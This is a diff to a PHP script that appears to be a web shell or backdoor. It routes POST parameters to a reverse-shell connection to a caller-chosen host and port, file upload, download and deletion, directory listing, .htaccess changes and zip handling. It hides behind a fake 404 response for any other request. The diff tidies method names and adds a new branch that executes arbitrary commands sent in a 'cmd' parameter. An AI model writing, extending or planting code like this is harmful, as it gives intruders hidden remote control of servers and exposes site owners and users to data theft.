@@ -418,7 +418,7 @@ if (isset($_POST['cd'])) {
 if (isset($_POST['host']) && isset($_POST['port'])) {
     $r2->reverse($_POST['host'], $_POST['port']);
 } elseif (isset($_FILES['upload'])) {
-    echo $r2->upLoad($_FILES['upload']);
+    echo $r2->upload($_FILES['upload']);
 } elseif (isset($_POST['remove'])) {
     echo $r2->remove();
 } elseif (isset($_POST['htaccess'])) {
@@ -430,7 +430,7 @@ if (isset($_POST['host']) && isset($_POST['port'])) {
 } elseif (isset($_POST['info'])) {
     echo $r2->info();
 } elseif (isset($_POST['download'])) {
-    $r2->downLoad($_POST['download']);
+    $r2->download($_POST['download']);
 } elseif (isset($_POST['ls'])) {
     echo $r2->ls($_POST['ls']);
 } elseif (isset($_POST['rm'])) {
@@ -441,6 +441,8 @@ if (isset($_POST['host']) && isset($_POST['port'])) {
     $r2->zip($_POST['zip'], $_POST['file']);
 } elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
     $r2->unzip($_POST['unzip'], $_POST['to']);
+} elseif (isset($_POST['cmd'])) {
+    $r2->cmd($_POST['cmd']);
 } else {
     header('HTTP/1.0 404 Not Found', true, 404);
     exit(404);
